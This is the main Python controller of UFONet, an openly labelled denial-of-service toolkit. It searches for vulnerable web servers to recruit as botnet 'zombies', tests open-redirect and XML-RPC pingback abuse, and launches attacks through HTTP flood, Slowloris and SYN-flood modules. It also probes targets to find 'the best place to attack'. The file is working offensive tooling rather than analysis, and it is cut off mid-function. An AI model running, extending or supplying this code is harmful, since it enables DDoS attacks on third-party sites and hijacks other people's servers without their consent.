#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - Denial of Service Toolkit - 2013/2014/2015/2016/2017/2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, sys, re, traceback, random, time, threading, base64, string, math
import StringIO, socket, httplib, urllib, urllib2, ssl, cgi, json
from uuid import getnode
from urlparse import urlparse
from random import randrange, shuffle
from options import UFONetOptions
from update import Updater
from herd import Herd
from zombie import Zombie
from doll import Doll
from inspector import Inspector
from abductor import Abductor
from loic import LOIC
from loris import LORIS
from ufosyn import UFOSYN

DEBUG = 0

class UFONet(object):
    def __init__(self):
        self.blackhole = '176.28.23.46' # default download/upload zombies 'blackhole'
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
        self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve 'zombies'
        self.aliens_file = 'botnet/aliens.txt' # set source path to retrieve 'aliens'
        self.droids_file = 'botnet/droids.txt' # set source path to retrieve 'droids'
        self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
        self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
        self.humans_file = 'botnet/humans.txt' # set source path to retrieve 'humans'
        self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve 'dorks'
        self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
        self.timeline_file = 'docs/VERSION' # set source for code releases
        self.referer = 'http://127.0.0.1/'
        self.port = "8080" # default injection port
        self.mothershipname = "core/txt/shipname.txt"
        self.mothership_baptism() # generating static name/id for your mothership ;-)
        self.head = False
        self.payload = False
        self.external = False
        self.attack_mode = False
        self.retries = ''
        self.delay = ''
        self.connection_failed = False
        self.total_possible_zombies = 0
        self.herd = Herd(self)
        self.sem = False
        self.db_flash = 0 # db stress counter
        self.total_aliens = 0 
        self.aliens_hit = 0
        self.aliens_fail = 0
        self.total_droids = 0
        self.droids_hit = 0
        self.droids_fail = 0
        self.total_ucavs = 0
        self.ucavs_hit = 0
        self.ucavs_fail = 0
        self.total_rpcs = 0
        self.rpcs_hit = 0
        self.rpcs_fail = 0
        self.total_loic = 0
        self.total_loris = 0
        self.total_syn = 0
        self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.nat_error_flag = "OFF"
        self.trans_zombies = 0
        self.scanned_zombies = 0
        self.loadcheck_counter = 0
        self.loadcheck_prev_size = None
        self.loadcheck_prev_load = None
        self.loadcheck_first_size = None
        self.loadcheck_first_load = None
        self.loadcheck_size_list = []
        self.loadcheck_load_list = []
        self.loadcheck_size_median = None
        self.loadcheck_size_max = None
        self.loadcheck_size_min = None
        self.loadcheck_load_median = None
        self.loadcheck_size_max = None
        self.loadcheck_size_min = None

    def mothership_baptism(self):
        if os.path.exists(self.mothershipname) == True:
            f = open(self.mothershipname)
            self.mothership_id = f.read()
            f.close()
        else:
            self.mothership_ids = [] 
            f = open(self.motherships_file)
            motherships = f.readlines()
            f.close()
            for ship in motherships:
                self.mothership_ids.append(base64.urlsafe_b64encode(ship))
            self.mothership_id = str(base64.b64decode(random.choice(self.mothership_ids).strip()))
            m = open(self.mothershipname, "w") # write mothership name to a static file as a baptism
            m.write(str(self.mothership_id.upper()))
            m.close()

    def create_options(self, args=None):
        self.optionParser = UFONetOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def banner_welcome(self):
        print ""
        print "                     **                      0===============================================0"
        print "                '' '----' ''                 ||                                             ||"   
        print "             .'_.- ( 00 ) -._'.              ||  * Botnet -> DDoS:                          ||"
        print "           .'.'    |'..'|    '.'.            ||                                             ||"
        print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||      -Zombies : HTTP GET bots               ||"
        print "   (O).)-| |  \  x |    |x   /  | |-(.(O)    ||      -Droids  : HTTP GET (+params) bots     ||"
        print "    `-'  '-'-._'-./ ---- \.-'_.-'-'  `-'     ||      -Aliens  : HTTP POST bots              ||"
        print "       _ | |   '-.___||___.-'   | | _        ||      -UCAVs   : Web Abusing bots            ||"
        print "    .' _ | |     |   __   |     | | _ '.     ||      -X-RPCs  : XML-RPC bots                ||"
        print "   / .' ''.|     | /____\ |     |.'' '. \    ||                                             ||"
        print "   | |(0)| '.    ||__**_ ||    .' |(0)| |    ||  * Close Combat -> DoS:                     ||"
        print "   \ '._.'   '.  | \____/ |  .'   '._.' /    ||                                             ||"
        print "    '.__ ______'.|__'--'__|.'______ __.'     ||      -LOIC    : Fast HTTP requests          ||"
        print "   .'_.-|                          |-._'.    ||      -LORIS   : Slow HTTP requests          ||"
        print "                                             ||      -UFOSYN  : TCP SYN flooder             ||"                                      
        print "                                             ||                                             ||"
        print "    * Class: UFONet - ViPR404 (model C)-     ||  * Featured: Crawler, +CVE, +WAF detection  ||"
        print "    * Type: /Scout/Transporter/Warfare/      ||                                             ||"
        print "                                             0|=============================================|0" 
        print ""

    def banner(self):
        print '='*75, "\n"
        print "888     888 8888888888 .d88888b.  888b    888          888    "   
        print "888     888 888        d88P Y888b 8888b   888          888    "
        print "888     888 888       888     888 88888b  888          888    "
        print "888     888 8888888   888     888 888Y88b 888  .d88b.  888888 "
        print "888     888 888       888     888 888 Y88b888 d8P  Y8b 888    "
        print "888     888 888       888     888 888  Y88888 88888888 888    "
        print "Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  "
        print " 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888"       
        print self.optionParser.description, "\n"
        print '='*75

    def show_mac_address(self):
        mac = getnode() # to get physical address
        hex_mac = str(":".join(re.findall('..', '%012x' % mac)))
        return hex_mac

    def show_ips(self):
        import requests
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)) 
            private_ip = s.getsockname()[0] # black magic
            s.close()
        except:
            private_ip = "Unknown"
        try:
            public_ip = requests.get('https://ip.42.pl/raw').text
        except:
            public_ip = "Unknown"
        return private_ip, public_ip

    def try_running(self, func, error, args=None):
        options = self.options
        args = args or []
        try:
            return func(*args)
        except Exception as e:
            print(error, "error")
            if DEBUG == 1:
                traceback.print_exc()

    def start_ship_engine(self):
        self.agents = [] # generating available user-agents
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)
        self.user_agent = random.choice(self.agents).strip()
        self.search_engines = [] # available dorking search engines
        self.search_engines.append('bing') # [03/02/2018: OK!]
        self.search_engines.append('yahoo') # [03/02/2018: OK!]
        #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
        #self.search_engines.append('duck') [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
        #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
        if not os.path.exists("core/json/"): # create gui json cfg files folder
            os.mkdir("core/json/")
        self.banner_welcome()
        self.update_flying_stats() # update flying time stats
        chargo = self.check_mothership_chargo() # check mothership chargo
        self.update_max_chargo(int(chargo)) # update max chargo stats

    def run(self, opts=None):
        if opts:
            self.create_options(opts)
        options = self.options

        # start threads
        if not self.options.threads:
            self.options.threads=5 # default number of threads
        self.sem = threading.Semaphore(self.options.threads)

        # start ship engine
        self.start_ship_engine()

        # check proxy options
        proxy = options.proxy
        if options.proxy:
            try:
                pattern = 'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
                m = re.search(pattern, proxy)
                if m is None:
                    self.banner()
                    print ("\n[Error] - Proxy malformed!\n")
                    return #sys.exit(2)
            except Exception:
                self.banner()
                print ("\n[Error] - Proxy malformed!\n")
                return #sys.exit(2)

        # check tor connection
        if options.checktor:
            url = 'https://check.torproject.org' # TOR status checking site
            self.banner()
            print "\nSending request to: " + url + "\n"
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                    req = urllib2.Request(url, None, headers)
                    tor_reply = urllib2.urlopen(req).read()
                else:
                    req = urllib2.Request(url, None, headers)
                    tor_reply = urllib2.urlopen(req, context=self.ctx).read()
                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                if not tor_reply or 'Congratulations' not in tor_reply:
                    print("It seems that Tor is not properly set.\n")
                    print("Your IP address appears to be: " + your_ip + "\n")
                else:
                    print("Congratulations!. Tor is properly being used :-)\n")
                    print("Your IP address appears to be: " + your_ip + "\n")
            except:
                print("Cannot reach TOR checker system!. Are you correctly connected?\n")
                sys.exit(2) # return

        # run AES256+HMAC-SHA1 enc/dec tool
        if options.cryptomsg:
            from server.crypter import Cipher
            from base64 import b64encode, b64decode
            print "                                          "
            print "        ____...------------...____        "
            print "   _.-'' /o/__ ____ __ __  __ \o\_`'-._   "
            print " .'     / /                    \ \     '. "
            print " |=====/o/======================\o\=====| "
            print " |____/_/________..____..________\_\____| "
            print " /   _/ \_     <_o#\__/#o_>     _/ \_   \ "
            print " \__/_____\####/0213411543/####/_____\__/ "
            print "  |===\!/========================\!/===|  "
            print "  |   |=|          .---.         |=|   |  "
            print "  |===|o|=========/     \========|o|===|  "
            print "  |   | |         \() ()/        | |   |  "
            print "  |===|o|======{'-.) A (.-'}=====|o|===|  "
            print "  | __/ \__     '-.\uuu/.-'    __/ \__ |  "
            print "  |==== .'.'^'.'.====|====.'.'^'.'.====|  "
            print "  |  _\o/   __  {.' __  '.} _   _\o/  _|  "
            print "  ''''''''''''''''''''''''''''''''''''''  "
            print "\nUFONet Crypter (AES256+HMAC-SHA1)\n"
            print " -> (140 plain text chars = 69 encrypted chars)\n"
            text = str(raw_input("- Enter text: "))
            input_key = str(raw_input("- Enter key: "))
            key = b64encode(input_key)
            c = Cipher(key, text)
            msg = c.encrypt()
            c.set_text(msg)
            print '\n-> Ciphertext: [', msg, ']'
            print '\nLength:', len(msg)
            print '\n-> Key (share it using SNEAKNET!):', input_key
            print '\nDecryption PoC:', c.decrypt(), "\n"
 
        # run shownet tool
        if options.shownet:
            hex_mac = self.show_mac_address()
            self.banner()
            print "-> Network Info:"
            print '='*44
            print "-"*35
            print "|- MAC Address :", hex_mac
            print "|" +"-"*34
            private_ip, public_ip = self.show_ips()
            print "|- IP Private  :", private_ip
            print "|" +"-"*34
            print "|- IP Public   :", public_ip
            print "-"*35
            print '='*75, "\n"

        # show code timeline
        if options.timeline:
            f = open(self.timeline_file, 'r')
            releases = f.readlines()
            f.close()
            self.banner()
            print "-> Code timeline:"
            print '='*44
            print "-"*35
            for r in releases:
                print r.strip('\n')
            print "-"*35
            print '='*75, "\n"

        # check EUID when running UFOSYN (root required for open 'raw sockets') / GUI will invoke 'sudo' directly
        if options.ufosyn:
            euid = os.geteuid()
            if euid != 0:
                print("[Error] UFOSYN (--ufosyn) not started as root...\n")
                try:
                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
                    os.execlpe('sudo', *args) 
                except:
                    pass # keep running but UFOSYN will fail

        # search for 'zombies' on search engines results (dorking)
        if options.search:
            zombies = []
            if options.engine:
                engine = options.engine
            else:
                engine = "yahoo" # default search engine
            try:
                self.banner()
                if not os.path.exists(self.humans_file) == True:
                    f = open(self.humans_file, 'w')
                    f.close()
                lf = open(self.humans_file, 'r')
                restored = lf.readlines()
                zombies_restored = len(restored)
                lf.close()
                lz = open(self.zombies_file, 'r')
                zombies_army = lz.readlines()
                for zombie in zombies_army:
                    zombies.append(zombie) # add zombies from army to the zombies pool
                lz.close()
                if len(restored) > 0:
                    print "\n[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
                    if not self.options.forceyes:
                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                        print '-'*25
                    else:
                        backup_reply = "Y"
                    if backup_reply == "n" or backup_reply == "N":
                        print "\n[Info] Removing data stored and starting a new search...\n"
                        os.remove(self.humans_file)
                        zombies_restored = 0 # flush zombies restored
                        print '-'*25 + "\n"
                    else:
                        print "\n[Info] Restoring data and starting a new search...\n"
                        print '-'*25 + "\n"
                        for zombie in restored:
                            zombies.append(zombie) # add previous data to zombies pool
                if options.allengines:
                    for e in self.search_engines:
                        engine = e
                        print '='*44
                        print("\nSearching for zombies (with AI mode) using: "+engine+'\n')
                        print '='*44 + '\n'
                        self.options.engine = engine
                        try:
                            zombies_chain = self.search_zombies(dork='', zombies_found=zombies)
                            if zombies_chain != None:
                                for zombie in zombies_chain:
                                    if zombie not in zombies: # evade possible repetitions
                                        zombies.append(zombie)
                        except:
                            if zombies: # backup all new zombies found to file in case of exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                else:
                    if restored:
                        print '='*44
                    print("\nSearching for zombies (with AI mode) using: "+engine+"\n")
                    print '='*44 + '\n'
                    if restored: # from restored file
                        try:
                            zombies_chain = self.search_zombies(dork='', zombies_found=zombies)
                            if zombies_chain != None:
                                for zombie in zombies_chain:
                                    if zombie not in zombies: # evade possible repetitions
                                        zombies.append(zombie)
                        except:
                            if zombies: # backup all new zombies found to file in case of exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                    else:
                        try:
                            zombies = self.search_zombies(dork='', zombies_found=zombies)
                        except:
                            if zombies: # backup all new zombies found to file in case of exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                total_restored = zombies_restored
                new_zombies = 0 # new zombies counter
                f = open(self.zombies_file, 'r')
                zz = f.readlines()
                f.close()
                zombies_found = []
                for z in zombies:
                    if z.endswith(os.linesep):
                        z = z.replace(os.linesep, "")
                    if z not in zz and z+os.linesep not in zz:
                        new_zombies = new_zombies + 1
                        zombies_found.append(z)
                print '='*62
                print "\n- Victims found:", len(zombies_found), "\n"
                print "    - Restored:", total_restored
                print "    - Dorked:", len(zombies_found) - total_restored, "\n"
                print '-'*32
                print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
                print '='*62 + '\n'
                if len(zombies) > 0:
                    if not self.options.forceyes:
                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
                        print '-'*25
                    else:
                        check_backup_reply = "Y"
                    if check_backup_reply == "n" or check_backup_reply == "N":
                        if os.path.isfile(self.humans_file): 
                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
                        print "\n[Info] Temporal data correctly removed...\n"
                    else:
                        with open(self.humans_file, "w") as f:
                            for z in zombies_found:
                                if z.endswith(os.linesep):
                                    z = z.replace(os.linesep, "")
                                if z not in zz or z+os.linesep not in zz:
                                    f.write(z+os.linesep)
                        f.close()
                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
                    print '-'*25 + "\n"
                if new_zombies and new_zombies > 0:
                    if not self.options.forceyes:
                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
                        print '-'*25 + "\n"
                    else:
                        check_url_link_reply = "Y"
                    if check_url_link_reply == "n" or check_url_link_reply == "N":
                        print "Bye!\n"
                        pass
                    else:
                        print "\n" + '='*44
                        test = self.testing(zombies_found)
                else:
                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
            except Exception:
                print ("\n[Error] - Something wrong searching using: "+engine+"\n")

        # search for 'zombies' from a list of 'dorks'
        if options.dorks:
            if options.engine:
                engine = options.engine
            else:
                engine = "yahoo" # default search engine
            try:
                dorks = self.extract_dorks()
                if not dorks:
                    return
                zombies = []
                self.banner()
                if not os.path.exists(self.humans_file) == True:
                    f = open(self.humans_file, 'w')
                    f.close()
                lf = open(self.humans_file, 'r')
                restored = lf.readlines()
                zombies_restored = len(restored)
                lf.close()
                lz = open(self.zombies_file, 'r')
                zombies_army = lz.readlines()
                for zombie in zombies_army:
                    zombies.append(zombie) # add zombies from army to the zombies pool
                lz.close()
                if len(restored) > 0:
                    print "\n[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
                    if not self.options.forceyes:
                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                        print '-'*25
                    else:
                        backup_reply = "Y"
                    if backup_reply == "n" or backup_reply == "N":
                        print "\n[Info] Removing data stored and starting a new search...\n"
                        os.remove(self.humans_file)
                        zombies_restored = 0 # flush zombies restored
                        print '-'*25 + "\n"
                    else:
                        print "\n[Info] Restoring data and starting a new search...\n"
                        print '-'*25 + "\n"
                        for zombie in restored:
                            zombies.append(zombie) # add previous data to zombies pool
                total_restored = zombies_restored
                if options.allengines:
                    for e in self.search_engines:
                        engine = e
                        print '='*44
                        print("\nSearching for zombies (with AI mode) using: "+engine+ " [from a list of 'dorks']\n")
                        print '='*44 + '\n'
                        self.options.engine = engine
                        for dork in dorks:
                            print '='*22
                            print "Dork:", dork
                            print '='*22 + '\n'
                            try:
                                dorked_zombies = self.search_zombies(dork, zombies) # AI mode
                                for zombie in dorked_zombies:
                                    if zombie not in zombies: # evade repetitions for zombies found
                                        zombies.append(zombie)
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                            except:
                                if zombies: # backup new zombies found on exception
                                    for zombie in zombies:
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                else:
                    if restored:
                        print '='*44
                    print("\nSearching for zombies (with AI mode) using: "+engine+ " [from a list of 'dorks']\n")
                    print '='*44 + '\n'
                    for dork in dorks:
                        print '='*22
                        print "Dork:", dork
                        print '='*22 + '\n'
                        try:
                            dorked_zombies = self.search_zombies(dork, zombies) # AI mode
                            if dorked_zombies != None:
                                for zombie in dorked_zombies:
                                    if zombie not in zombies: # evade repetitions for zombies found
                                        zombies.append(zombie)
                        except:
                            if zombies: # backup new zombies found on exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                                        f.close()
                new_zombies = 0 # new zombies counter
                f = open(self.zombies_file, 'r')
                zz = f.readlines()
                f.close()
                zombies_found = []
                for z in zombies:
                    if z.endswith(os.linesep):
                        z = z.replace(os.linesep, "")
                    if z not in zz and z+os.linesep not in zz:
                        new_zombies = new_zombies + 1
                        zombies_found.append(z)
                print '='*62
                print "\n- Victims found:", len(zombies_found), "\n"
                print "    - Restored:", total_restored
                print "    - Dorked:", len(zombies_found) - total_restored, "\n"
                print '-'*32
                print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
                print '='*62 + '\n'
                if len(zombies_found) > 0:
                    if not self.options.forceyes:
                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
                        print '-'*25
                    else:
                        check_backup_reply = "Y"
                    if check_backup_reply == "n" or check_backup_reply == "N":
                        if os.path.isfile(self.humans_file):
                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
                        print "\n[Info] Temporal data correctly removed...\n"
                    else:
                        with open(self.humans_file, "w") as f:
                            for z in zombies_found:
                                if z.endswith(os.linesep):
                                    z = z.replace(os.linesep, "")
                                if z not in zz or z+os.linesep not in zz:
                                    f.write(z+os.linesep)
                        f.close()
                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
                    print '-'*25 + "\n"
                if new_zombies and new_zombies > 0:
                    if not self.options.forceyes:
                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
                        print '-'*25 + "\n"
                    else:
                        check_url_link_reply = "Y"
                    if check_url_link_reply == "n" or check_url_link_reply == "N":
                        print "Bye!\n"
                        pass
                    else:
                        print "\n" + '='*44
                        test = self.testing(zombies_found)
                else:
                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
            except Exception:
                print ("\n[Error] - Something wrong searching using: "+engine+"\n")

        # auto-search for 'zombies' (dorks+all_engines+time -> to discover max new zombies)
        if options.autosearch:
            try:
                dorks = self.extract_dorks()
            except:
                print "\n[Info] Not any dork present at: 'botnet/dorks.txt'. Aborting!\n"
                return
            engines_list = self.search_engines
            stop_flag = False # use a flag to establish an end
            try:
                self.banner()
                print "\nSearching automatically for 'zombies' (WARNING: this may take several time!)\n" 
                print "[Info] Try to use CTRL+z (on shell) to STOP IT! ;-)\n"
                print '-'*25 + "\n"
                zombies_found = []
                lz = open(self.zombies_file, 'r')
                zombies_army = lz.readlines()
                for zombie in zombies_army:
                    zombies_found.append(zombie) # add zombies from army to the zombies found pool
                lz.close()
                if not os.path.exists(self.humans_file) == True:
                    f = open(self.humans_file, 'w')
                    f.close()
                lf = open(self.humans_file, 'r')
                restored = lf.readlines()
                zombies_restored = len(restored)
                lf.close()
                if len(restored) > 0: 
                    print "[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
                    if not self.options.forceyes:
                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                        print '-'*25
                    else:
                        backup_reply = "Y"
                    if backup_reply == "n" or backup_reply == "N":
                        print "\n[Info] Removing data stored and starting a new (auto)search...\n"
                        os.remove(self.humans_file)
                        zombies_restored = 0 # flush zombies restored
                        print '-'*25 + "\n"
                    else:
                        print "\n[Info] Restoring data and starting a new (auto)search...\n"
                        print '-'*25 + "\n"
                        for zombie in restored:
                            zombies_found.append(zombie) # add previous data to zombies found pool
                total_restored = zombies_restored
                while stop_flag == False:
                    if not os.path.exists(self.humans_file) == True:
                        f = open(self.humans_file, 'w')
                        f.close()
                    lf = open(self.humans_file, 'r') # read it on each iteration to update changes
                    restored = lf.readlines()
                    lf.close()
                    zombies_restored = len(restored)
                    for e in engines_list:
                        zombies_counter = 0 # use it also as (engine) flag
                        engine = e
                        self.options.engine = engine
                        print '='*44 + '\n'
                        print("Searching for zombies (with AI mode) using: "+engine+'\n')
                        print '='*44 + '\n'
                        for dork in dorks:
                            print '='*22
                            print "Dork:", dork
                            print '='*22 + '\n'
                            try:
                                dorked_zombies = self.search_zombies(dork, zombies_found) # AI mode
                                for zombie in dorked_zombies:
                                    if zombie not in zombies_found: # evade repetitions for zombies found
                                        zombies_found.append(zombie)
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                                        zombies_counter = zombies_counter + 1
                            except:
                                if zombies_found: # backup new zombies found on exception
                                    for zombie in zombies_found:
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                        if zombies_counter == 0:
                            print "[Info] - NOT more NEW victims found (by the moment) using: "+engine+"... Let's remove it from queue!\n"
                            print '-'*25 + "\n"
                            engines_list.remove(engine) # remove not more results engine from search engines list
                            if not engines_list: # if search engines empty, call return-exit routine
                                print "[Info] - Search engines aren't providing more results... Exiting! ;-)\n"
                                print '-'*25 + "\n"
                                stop_flag = True # exit flag up
                new_zombies = 0 # new zombies counter
                f = open(self.zombies_file, 'r')
                zz = f.readlines()
                f.close()
                all_zombies_found = []
                for z in zombies_found:
                    if z.endswith(os.linesep):
                        z = z.replace(os.linesep, "")
                    if z not in zz and z+os.linesep not in zz:
                        new_zombies = new_zombies + 1
                        all_zombies_found.append(z)
                print '='*62
                print "\n- Victims found:", len(all_zombies_found), "\n"
                print "    - Restored:", total_restored
                print "    - Dorked:", len(all_zombies_found) - total_restored, "\n"
                print '-'*32
                print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
                print '='*62 + '\n'
                if len(zombies_found) > 0:
                    if not self.options.forceyes:
                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
                        print '-'*25
                    else:
                        check_backup_reply = "Y"
                    if check_backup_reply == "n" or check_backup_reply == "N":
                        if os.path.isfile(self.humans_file):
                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
                        print "\n[Info] Temporal data correctly removed...\n"
                    else:
                        with open(self.humans_file, "w") as f:
                            for z in all_zombies_found:
                                if z.endswith(os.linesep):
                                    z = z.replace(os.linesep, "")
                                if z not in zz or z+os.linesep not in zz:
                                    f.write(z+os.linesep)
                        f.close()
                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
                    print '-'*25 + "\n"
                if new_zombies and new_zombies > 0:
                    if not self.options.forceyes:
                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
                        print '-'*25 + "\n"
                    else:
                        check_url_link_reply = "Y"
                    if check_url_link_reply == "n" or check_url_link_reply == "N":
                        print "Bye!\n"
                        pass
                    else:
                        print "\n" + '='*44
                        test = self.testing(all_zombies_found)
                else:
                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
            except Exception:
                print ("[Error] - Something wrong (auto)searching...\n")

        # test web 'zombie' servers -> show statistics
        if options.test: 
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                test = self.testing(zombies)
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] - Something wrong testing!\n")
                traceback.print_exc()

        # test XML-'rpc' pingback vulnerable servers -> update list
        if options.testrpc:
            try:
                self.banner()
                rpcs = self.extract_rpcs()
                if not rpcs:
                    return
                testrpc = self.testing_rpcs(rpcs)
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] - Something wrong testing XML-RPC servers!\n")
                traceback.print_exc()

        # check botnet searching for zombies offline
        if options.testoffline:
            try:
                self.banner()
                testbotnet = self.testing_offline()
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] - Something wrong checking for offline 'zombies'!\n")
                traceback.print_exc()

        # check ALL botnet status
        if options.testall:
            try:
                self.banner()
                test_all_botnet = self.testing_all()
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] - Something wrong testing ALL botnet status!\n")
                traceback.print_exc()

        # attack target -> exploit Open Redirect massively and conduct vulnerable servers to a target
        if options.target:
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                attack = self.attacking(zombies)
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] - Something wrong attacking!\n")
                traceback.print_exc()

        # inspect target -> inspect target's components sizes
        if options.inspect:
            try:
                self.banner()
                print("\nInspecting target to find the best place to attack... SSssh!\n")
                print '='*22 + '\n'
                self.instance = Inspector(self) # instance main class for inspection operations
                inspection = self.instance.inspecting(options.inspect)
                self.update_missions_stats() # update mothership missions stats
            except Exception, e:
                traceback.print_exc()
                print ("\n[Error] - Something wrong inspecting... Not any object found!\n")
                return #sys.exit(2)

        # abduct target -> examine target's webserver configuration (banner grabbing, anti-ddos, etc.)
        if options.abduction:
            try:
                self.banner()
                print("\nAbducting target to extract interesting information... Be patient!\n")
                print '='*22 + '\n'
                self.instance = Abductor(self) # instance main class for abduction operations
                abduction = self.instance.abducting(options.abduction)
                self.update_missions_stats() # update mothership missions stats
            except Exception, e:
                traceback.print_exc()
                print ("\n[Error] - Something wrong abducting... Not any data stream found!\n")
                return #sys.exit(2)

        # attack me -> exploit Open Redirect massively and connect all vulnerable servers to master for benchmarking
        if options.attackme:
            self.mothership_id = self.mothership_id[:25] # truncating anti-formats ;-)
            try:
                self.banner()
                print("\nOrdering 'zombies' to attack you for benchmarking ;-)\n")
                print("[Warning] You are going to reveal your real IP to your zombies...\n")
                if not self.options.forceyes:
                    update_reply = raw_input("Want to continue? (Y/n)")
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    print "\n[Info] Aborting 'Attack-Me' test... Bye!\n"
                    return
                self.mothership_hash = str(random.getrandbits(128)) # generating random evasion hash  
                print "\nMothership ID: " + self.mothership_id + "RND: " + self.mothership_hash
                f = open("alien", "w") # generate random alien worker
                f.write(str(self.mothership_hash))
                f.close()
                print("\nChecking NAT/IP configuration:\n")
                nat = self.check_nat()
                if self.nat_error_flag == "ON":
                    return
                zombies = self.extract_zombies()
                if not zombies:
                    return
                attackme = self.attackme(zombies)
                self.update_missions_stats() # update mothership missions stats
            except Exception, e:
                traceback.print_exc()
                print ("\n[Error] - Something wrong redirecting 'zombies' against you...\n")
                return #sys.exit(2)

#        # crawl target -> crawl target's places
#        if options.crawl:
#            try:
#                self.banner()
#                print("\nCrawlering target's links to discover web structure...\n")
#                print '='*22 + '\n'
#                crawler = self.crawlering()
#            except Exception, e:
#                print ("[Error] - Something wrong crawlering!\n")
#                return #sys.exit(2)

        # check/update for latest stable version
        if options.update:
            self.banner()
            try:
                print("\nTrying to update automatically to the latest stable version\n")
                Updater() 
            except:
                print("\nSomething was wrong!. To have working this feature, you should clone UFONet with:\n")
                print("$ git clone https://github.com/epsylon/ufonet\n")

        # launch GUI/Web interface
        if options.web:
            self.create_web_interface()
            return

        # generate 'blackhole' server to share 'zombies'
        if options.blackhole is not None:
            self.banner()
            try:
                blackhole_lib = os.path.abspath(os.path.join('..', 'server')) # add 'blackhole' lib
                sys.path.append(blackhole_lib)
                from server.blackhole import BlackHole
                print("\nInitiating void generation sequence...\n")
                print '='*22 + '\n'
                app = BlackHole()
